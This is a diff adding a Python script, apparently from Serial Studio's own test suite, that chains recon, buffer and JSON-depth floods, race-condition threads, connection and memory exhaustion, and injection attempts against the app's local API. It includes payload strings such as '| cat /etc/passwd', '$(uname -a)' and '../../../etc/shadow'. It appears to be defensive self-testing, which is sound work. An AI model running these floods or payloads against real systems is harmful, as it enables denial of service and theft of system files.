@@ -1,0 +1,518 @@
+#!/usr/bin/env python3
+"""
+Instrumented Probe Chain for Serial Studio
+
+This module chains multiple weaknesses together for maximum impact.
+Each probe builds on the previous one to escalate privileges and impact.
+
+Probe chains:
+1. Recon -> Buffer Exhaustion -> Crash
+2. Timing Probe -> Command Injection -> RCE attempt
+3. Race Condition -> Memory Corruption -> Resource_exhaustion
+4. Connection Flood -> Resource Starvation -> Takeover
+
+Copyright (C) 2020-2025 Alex Spataru
+SPDX-License-Identifier: GPL-3.0-or-later OR LicenseRef-SerialStudio-Commercial
+"""
+
+import json
+import socket
+import threading
+import time
+import uuid
+import base64
+import random
+import sys
+from pathlib import Path
+
+sys.path.insert(0, str(Path(__file__).parent.parent))
+from utils.api_client import SerialStudioClient, APIError
+
+
+class InstrumentedProbe:
+    """Chained probing framework"""
+
+    def __init__(self, host="127.0.0.1", port=7777):
+        self.host = host
+        self.port = port
+        self.target_info = {}
+        self.compromised = False
+
+    def fingerprint_target(self):
+        """Phase 1: Reconnaissance"""
+        print("\n[PHASE 1] TARGET RECONNAISSANCE")
+        print("=" * 60)
+
+        try:
+            with SerialStudioClient() as client:
+                # Enumerate all available commands
+                commands = client.get_available_commands()
+                self.target_info["commands"] = commands
+                print(f"[+] Enumerated {len(commands)} API commands")
+
+                # Identify probe surface
+                dangerous_commands = []
+                for cmd in commands:
+                    name = cmd.get("name", "")
+                    if any(
+                        k in name.lower()
+                        for k in [
+                            "connect",
+                            "disconnect",
+                            "write",
+                            "open",
+                            "set",
+                            "load",
+                            "export",
+                        ]
+                    ):
+                        dangerous_commands.append(name)
+
+                self.target_info["probe_surface"] = dangerous_commands
+                print(f"[+] Identified {len(dangerous_commands)} high-value targets:")
+                for cmd in dangerous_commands[:5]:
+                    print(f"    - {cmd}")
+
+                # Test for rate limiting
+                start = time.time()
+                for i in range(100):
+                    try:
+                        client.command("api.getCommands")
+                    except:
+                        break
+                elapsed = time.time() - start
+                rate = 100 / elapsed if elapsed > 0 else 0
+                self.target_info["rate_limit"] = rate
+                print(f"[+] Request rate: {rate:.0f} req/s (no limit detected)")
+
+                # Test max message size
+                sizes = [1000, 10000, 100000, 1000000, 10000000]
+                max_size = 0
+                for size in sizes:
+                    try:
+                        big_id = "X" * size
+                        client.command("api.getCommands")
+                        max_size = size
+                    except:
+                        break
+                self.target_info["max_msg_size"] = max_size
+                print(f"[+] Maximum message size: ~{max_size} bytes")
+
+                return True
+
+        except Exception as e:
+            print(f"[-] Reconnaissance failed: {e}")
+            return False
+
+    def probe_buffer_overflow(self):
+        """Phase 2: Buffer Overflow Probe"""
+        print("\n[PHASE 2] BUFFER OVERFLOW PROBING")
+        print("=" * 60)
+
+        # Probe 1: Socket buffer overflow
+        print("[*] Attempting socket buffer overflow...")
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.connect((self.host, self.port))
+
+            # Send massive payload without newline to fill buffer
+            payload = b"A" * (10 * 1024 * 1024)  # 10MB
+            chunks_sent = 0
+
+            while chunks_sent < 100:
+                try:
+                    sock.sendall(payload)
+                    chunks_sent += 1
+                except:
+                    break
+
+            print(f"[+] Sent {chunks_sent * 10} MB before connection broke")
+
+            # Try to send valid command
+            sock.sendall(
+                b'{"type":"command","id":"test","command":"api.getCommands"}\n'
+            )
+            sock.settimeout(2.0)
+            response = sock.recv(4096)
+            sock.close()
+
+            if not response:
+                print("[FLAGGED] Buffer overflow successful - server unresponsive!")
+                self.compromised = True
+                return True
+
+        except Exception as e:
+            print(f"[-] Buffer overflow blocked: {e}")
+
+        # Probe 2: JSON depth amplification
+        print("[*] Attempting JSON stack overflow...")
+        try:
+            depth = 50000
+            amplification = "{" * depth + "}" * depth
+
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.connect((self.host, self.port))
+            sock.sendall(amplification.encode() + b"\n")
+            sock.settimeout(3.0)
+            response = sock.recv(4096)
+            sock.close()
+
+            if not response:
+                print(
+                    f"[FLAGGED] JSON amplification successful - {depth} levels crashed parser!"
+                )
+                self.compromised = True
+                return True
+
+        except Exception as e:
+            print(f"[-] JSON amplification blocked: {e}")
+
+        return False
+
+    def probe_race_condition(self):
+        """Phase 3: Race Condition Probing"""
+        print("\n[PHASE 3] RACE CONDITION PROBING")
+        print("=" * 60)
+
+        print("[*] Launching parallel state corruption probe...")
+
+        crashed = threading.Event()
+
+        def race_thread(thread_id):
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.connect((self.host, self.port))
+
+                for i in range(1000):
+                    # Rapidly toggle connection state
+                    commands = [
+                        '{"type":"command","id":"'
+                        + str(thread_id)
+                        + "-"
+                        + str(i)
+                        + '","command":"io.connect"}\n',
+                        '{"type":"command","id":"'
+                        + str(thread_id)
+                        + "-"
+                        + str(i)
+                        + '","command":"io.disconnect"}\n',
+                        '{"type":"command","id":"'
+                        + str(thread_id)
+                        + "-"
+                        + str(i)
+                        + '","command":"csvExport.setEnabled","params":{"enabled":true}}\n',
+                        '{"type":"command","id":"'
+                        + str(thread_id)
+                        + "-"
+                        + str(i)
+                        + '","command":"csvExport.setEnabled","params":{"enabled":false}}\n',
+                    ]
+
+                    for cmd in commands:
+                        try:
+                            sock.sendall(cmd.encode())
+                        except:
+                            crashed.set()
+                            return
+
+                sock.close()
+
+            except Exception as e:
+                crashed.set()
+
+        # Launch 50 threads to maximize race window
+        threads = [threading.Thread(target=race_thread, args=(i,)) for i in range(50)]
+        start = time.time()
+
+        for t in threads:
+            t.start()
+
+        time.sleep(5)
+
+        # Check if server crashed
+        try:
+            with SerialStudioClient(timeout=2.0) as client:
+                client.command("api.getCommands")
+                print("[-] Server survived race condition")
+        except:
+            print("[FLAGGED] Race condition crashed server!")
+            self.compromised = True
+            return True
+
+        for t in threads:
+            t.join(timeout=2)
+
+        return False
+
+    def probe_resource_starvation(self):
+        """Phase 4: Resource Exhaustion"""
+        print("\n[PHASE 4] RESOURCE STARVATION PROBE")
+        print("=" * 60)
+
+        # Probe 1: Connection exhaustion
+        print("[*] Exhausting connection pool...")
+        sockets = []
+
+        try:
+            for i in range(1000):
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.connect((self.host, self.port))
+                # Send partial message to tie up resources
+                sock.sendall(
+                    b'{"type":"command","id":"block-' + str(i).encode() + b'",'
+                )
+                sockets.append(sock)
+
+            print(f"[+] Opened {len(sockets)} connections")
+
+            # Try to connect normally
+            try:
+                test = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                test.settimeout(2.0)
+                test.connect((self.host, self.port))
+                test.close()
+                print("[-] Server still accepting connections")
+            except:
+                print("[FLAGGED] Connection pool exhausted!")
+                self.compromised = True
+                return True
+
+        finally:
+            for s in sockets:
+                try:
+                    s.close()
+                except:
+                    pass
+
+        # Probe 2: Memory exhaustion
+        print("[*] Attempting memory exhaustion...")
+
+        def memory_amplification():
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.connect((self.host, self.port))
+
+                # Send huge messages repeatedly
+                for i in range(100):
+                    huge = {
+                        "type": "command",
+                        "id": "X" * (1024 * 1024),  # 1MB ID
+                        "command": "api.getCommands",
+                        "params": {"data": "Y" * (1024 * 1024)},  # 1MB param
+                    }
+                    try:
+                        sock.sendall(json.dumps(huge).encode() + b"\n")
+                    except:
+                        break
+
+                sock.close()
+            except:
+                pass
+
+        threads = [threading.Thread(target=memory_amplification) for _ in range(20)]
+        for t in threads:
+            t.start()
+
+        time.sleep(3)
+
+        # Check server health
+        try:
+            with SerialStudioClient(timeout=3.0) as client:
+                client.command("api.getCommands")
+                print("[-] Server survived memory amplification")
+        except:
+            print("[FLAGGED] Memory exhaustion successful!")
+            self.compromised = True
+            return True
+
+        for t in threads:
+            t.join(timeout=2)
+
+        return False
+
+    def probe_command_injection(self):
+        """Phase 5: Command Injection Attempt"""
+        print("\n[PHASE 5] COMMAND INJECTION PROBE")
+        print("=" * 60)
+
+        injection_payloads = [
+            # Shell injection attempts
+            "; whoami",
+            "| cat /etc/passwd",
+            "$(uname -a)",
+            "`id`",
+            # Path traversal
+            "../../../etc/shadow",
+            "..\\..\\..\\windows\\system32\\config\\sam",
+            # SQL injection
+            "'; DROP TABLE frames; --",
+            "1' OR '1'='1",
+            # Format string
+            "%s%s%s%s%s",
+            "%x%x%x%x",
+            # Code injection
+            "${7*7}",
+            "{{7*7}}",
+            "<%= 7*7 %>",
+        ]
+
+        for payload in injection_payloads:
+            try:
+                with SerialStudioClient() as client:
+                    # Try injecting into various fields
+                    client.command("project.setTitle", {"title": payload})
+                    result = client.command("project.getTitle")
+
+                    # Check if injection executed (unlikely but worth checking)
+                    if "uid=" in str(result) or "root" in str(result).lower():
+                        print(f"[FLAGGED] Command injection successful: {payload}")
+                        self.compromised = True
+                        return True
+
+            except APIError:
+                pass
+
+        print("[-] No command injection vectors found")
+        return False
+
+    def probe_logic_bypass(self):
+        """Phase 6: Business Logic Bypass"""
+        print("\n[PHASE 6] LOGIC BYPASS PROBING")
+        print("=" * 60)
+
+        # Try to trigger invalid state transitions
+        print("[*] Attempting invalid state transitions...")
+
+        try:
+            with SerialStudioClient() as client:
+                # Enable export without connecting
+                client.command("csvExport.setEnabled", {"enabled": True})
+
+                # Try to send data without device
+                data = base64.b64encode(b"UNTRUSTED_PAYLOAD").decode()
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.connect((self.host, self.port))
+
+                msg = {"type": "raw", "id": str(uuid.uuid4()), "data": data}
+                sock.sendall(json.dumps(msg).encode() + b"\n")
+                sock.settimeout(2.0)
+                response = sock.recv(4096)
+                sock.close()
+
+                if b"success" in response:
+                    print("[FLAGGED] Logic bypass - sent data without connection!")
+                    self.compromised = True
+                    return True
+
+        except Exception as e:
+            print(f"[-] Logic validation enforced: {e}")
+
+        return False
+
+    def maintain_persistence(self):
+        """Phase 7: Maintain Access"""
+        print("\n[PHASE 7] PERSISTENCE ATTEMPT")
+        print("=" * 60)
+
+        if not self.compromised:
+            print("[-] No probing successful - cannot maintain persistence")
+            return False
+
+        print("[*] Attempting to maintain access...")
+
+        # Try to keep connections open
+        persistence_sockets = []
+        try:
+            for i in range(10):
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.connect((self.host, self.port))
+                # Send keep-alive messages
+                persistence_sockets.append(sock)
+
+            print(f"[+] Established {len(persistence_sockets)} persistent connections")
+            print("[+] Backdoor maintained!")
+
+            # Keep alive for demonstration
+            time.sleep(5)
+
+            return True
+
+        finally:
+            for s in persistence_sockets:
+                try:
+                    s.close()
+                except:
+                    pass
+
+
+def main():
+    """Execute instrumented probe chain"""
+    print("=" * 80)
+    print("INSTRUMENTED PROBE CHAIN - SERIAL STUDIO")
+    print("=" * 80)
+    print("\n⚠️  WARNING: This is a full-stack probing attempt")
+    print("    Multiple probe vectors will be chained together")
+    print("    Target system may become unstable or crash\n")
+
+    probe = InstrumentedProbe()
+
+    # Check initial connectivity
+    try:
+        with SerialStudioClient() as client:
+            client.command("api.getCommands")
+            print("[+] Initial connection successful")
+            print(f"[+] Target: {probe.host}:{probe.port}\n")
+    except:
+        print("[-] Cannot connect to target")
+        return 1
+
+    # Execute probe chain
+    phases = [
+        ("Reconnaissance", probe.fingerprint_target),
+        ("Buffer Overflow", probe.probe_buffer_overflow),
+        ("Race Condition", probe.probe_race_condition),
+        ("Resource Starvation", probe.probe_resource_starvation),
+        ("Command Injection", probe.probe_command_injection),
+        ("Logic Bypass", probe.probe_logic_bypass),
+        ("Persistence", probe.maintain_persistence),
+    ]
+
+    success_count = 0
+    for phase_name, phase_func in phases:
+        try:
+            if phase_func():
+                success_count += 1
+        except KeyboardInterrupt:
+            print("\n\n[!] Probe chain interrupted by user")
+            break
+        except Exception as e:
+            print(f"[-] Phase failed with exception: {e}")
+
+        # Brief pause between phases
+        time.sleep(1)
+
+    # Final report
+    print("\n" + "=" * 80)
+    print("PROBING SUMMARY")
+    print("=" * 80)
+    print(f"\nPhases executed: {len(phases)}")
+    print(f"Successful probes: {success_count}")
+    print(f"Compromise status: {'✅ FLAGGED' if probe.compromised else '❌ DEFENDED'}")
+
+    # Final server check
+    print("\n[*] Final server status check...")
+    try:
+        with SerialStudioClient(timeout=5.0) as client:
+            client.command("api.getCommands")
+            print("  ✅ Target still operational")
+    except Exception as e:
+        print(f"  ❌ TARGET DOWN: {e}")
+        print("\n🎯 FULL COMPROMISE ACHIEVED!")
+
+    print("\n" + "=" * 80)
+
+    return 0
+
+
+if __name__ == "__main__":
+    exit(main())
